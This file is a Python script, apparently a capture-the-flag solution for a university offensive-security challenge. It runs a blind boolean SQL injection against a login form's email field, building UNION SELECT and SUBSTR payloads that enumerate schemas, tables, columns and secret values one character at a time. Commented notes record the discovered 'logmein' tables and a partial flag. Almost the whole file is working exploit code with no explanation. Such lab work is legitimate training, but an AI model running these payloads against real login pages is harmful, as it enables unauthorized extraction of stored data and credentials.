import requests, urllib

valid_structure_chars = list("abcdefghijklmnopqrstuvwxyz0123456789$_")
valid_chars = list("abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()-_=+[{}]|\:;?/>.<,")
cookie = {'CHALBROKER_USER_ID':'jlp644'}



def guess_schema_count():
  schema_chars = []
  for c in valid_structure_chars:
    query_string = "' UNION SELECT 1,2,3 from information_schema.schemata WHERE IF(SUBSTR(SCHEMA_NAME,1,1)='" + c + "',1,0) LIMIT 1 OFFSET 0-- -"
    payload ={"email":query_string, "password": "123"}
    try:
          r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?',
                            data = payload,
                            cookies = cookie,
                            allow_redirects = False)
    except requests.exceptions.ConnectionError:
            print "Connection reset! Continuing..."
            pass
    if r.status_code == 302:
      schema_chars.append(c)
      print "FOUND: " + c
  return schema_chars

def parse_schema_names(starts_with):
  beginning = starts_with
  index = 2
  found = False
  database_name = starts_with
  while True:
    for c in valid_structure_chars:
      query_string = "' UNION SELECT 1,2,3 from information_schema.schemata WHERE IF(SUBSTR(SCHEMA_NAME," + str(index) + ",1)='" + c + "',1,0) AND SCHEMA_NAME LIKE '" + database_name + "%'-- -"
      payload ={"email":query_string, "password": "123"}
      try:
        r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?',
                          data = payload,
                          cookies = cookie,
                          allow_redirects = False)
      except requests.exceptions.ConnectionError:
        print "Connection reset! Continuing..."
        pass
      if r.status_code == 302:
        
        if found:
          print "Found a second match: " + c #Proceed to start a second loop
          return database_name
        else:
          database_name += c
          print database_name
        found = True
    if not found:
      break
    found = False
    index+=1
  return database_name

def guess_table_names(schema_name):
  table_chars = []
  for c in valid_structure_chars:
    query_string = "' UNION SELECT 1,2,3 from information_schema.tables WHERE IF(SUBSTR(TABLE_NAME,1,1)='" + c + "',1,0) AND TABLE_SCHEMA='logmein'-- -"
    payload ={"email":query_string, "password": "123"}
    try:
      r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?',
                        data = payload,
                        cookies = cookie,
                        allow_redirects = False)
    except requests.exceptions.ConnectionError:
      print "Connection reset! Continuing..."
      pass
    if r.status_code == 302:
      table_chars.append(c)
      print "FOUND: " + c
  return table_chars

def parse_table_names(schema_name, starts_with):
  beginning = starts_with
  index = 2
  found = False
  table_name = starts_with
  while True:
    for c in valid_structure_chars:
      query_string = "' UNION SELECT 1,2,3 from information_schema.tables WHERE IF(SUBSTR(TABLE_NAME," + str(index) + ",1)='" + c + "',1,0) AND TABLE_SCHEMA = '" + schema_name + "' AND TABLE_NAME LIKE '" + table_name + "%'-- -"
      payload ={"email":query_string, "password": "123"}
      try:
        r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?',
                          data = payload,
                          cookies = cookie,
                          allow_redirects = False)
      except requests.exceptions.ConnectionError:
        print "Connection reset! Continuing..."
        pass
      if r.status_code == 302:
        
        if found:
          print "Found a second match: " + c #Proceed to start a second loop
          return table_name
        else:
          table_name += c
          print "FOUND: " + table_name
        found = True
    if not found:
      break
    found = False
    index+=1
  return table_name

def guess_column_names(schema_name, table_name):
  column_chars = []
  for c in valid_structure_chars:
    query_string = "' UNION SELECT 1,2,3 from information_schema.columns WHERE IF(SUBSTR(COLUMN_NAME,1,1)='" + c + "',1,0) AND TABLE_SCHEMA='" + schema_name + "' AND TABLE_NAME='" + table_name + "'-- -"
    payload ={"email":query_string, "password": "123"}
    try:
      r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?',
                        data = payload,
                        cookies = cookie,
                        allow_redirects = False)
    except requests.exceptions.ConnectionError:
      print "Connection reset! Continuing..."
      pass
    if r.status_code == 302:
      column_chars.append(c)
      print "FOUND: " + c
  return column_chars

def parse_column_names(schema_name, table_name, starts_with):
  beginning = starts_with
  index = 2
  found = False
  column_name = starts_with
  while True:
    for c in valid_structure_chars:
      query_string = "' UNION SELECT 1,2,3 from information_schema.columns WHERE IF(SUBSTR(COLUMN_NAME," + str(index) + ",1)='" + c + "',1,0) AND TABLE_SCHEMA = '" + schema_name + "' AND TABLE_NAME = '" + table_name +"' AND COLUMN_NAME LIKE '" + column_name + "%'-- -"
      payload ={"email":query_string, "password": "123"}
      try:
        r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?',
                          data = payload,
                          cookies = cookie,
                          allow_redirects = False)
      except requests.exceptions.ConnectionError:
        print "Connection reset! Continuing..."
        pass
      if r.status_code == 302:
        
        if found:
          print "Found a second match: " + c #Proceed to start a second loop
          return column_name
        else:
          column_name += c
          print "FOUND: " + column_name
        found = True
    if not found:
      break
    found = False
    index+=1
  return column_name

def guess_row_count(schema_name, table_name, column_name):
  row_chars = []
  for c in valid_structure_chars:
    query_string = "' UNION SELECT " + column_name + ", value, 3 from " + schema_name + "." + table_name + " WHERE IF(SUBSTR(" + column_name + ",1,1)='" + c + "',1,0) LIMIT 3 OFFSET 0-- -"
    payload ={"email":query_string, "password": "123"}
    try:
      r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?',
                        data = payload,
                        cookies = cookie,
                        allow_redirects = False)
    except requests.exceptions.ConnectionError:
      print "Connection reset! Continuing..."
      pass
    if r.status_code == 302:
      row_chars.append(c)
      print "FOUND: " + c
  return row_chars

def parse_row_value(schema_name, table_name, column_name, starts_with):
  index = 47
  found = False
  row_value = starts_with
  while True:
    for c in valid_chars:
      query_string = "' UNION SELECT 1, 2, 3 from " + schema_name + "." + table_name + " WHERE IF(SUBSTR(" + column_name + "," + str(index) + ",1)='" + c + "',1,0) AND " + column_name + " LIKE '" + row_value + "%' -- -"
      payload ={"email":query_string, "password": "123"}
      try:
        r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php?',
                          data = payload,
                          cookies = cookie,
                          allow_redirects = False)
      except requests.exceptions.ConnectionError:
        print "Connection reset! Continuing..."
        pass
      if r.status_code == 302:
        if found:
          print "Found a second match: " + c #Proceed to start a second loop
          return row_value
        else:
          row_value += c
          print "FOUND: " + row_value
        found = True
    if not found:
      break
    found = False
    index+=1
  return row_value

#schema_char_list = guess_schema_count()
#print schema_char_list
#for c in schema_char_list:
#  print parse_schema_names(c) # information_schema, logmein
#
#table_char_list = guess_table_names('logmein') #s, u
#for c in table_char_list:
#  print "Table: "+ parse_table_names('logmein', c) # secrets, users
#
#column_char_list = guess_column_names('logmein', 'secrets')
#for c in column_char_list:
#  print "Column: " + parse_column_names('logmein', 'secrets', c) # id, value

#row_char_list = guess_row_count('logmein', 'secrets', 'id')
#row_char_list = guess_row_count('logmein', 'secrets', 'value')
print parse_row_value('logmein', 'secrets', 'value', 'flag{1_r3ally_d0nt_have_a_g00d_id3a_for_a_flag')

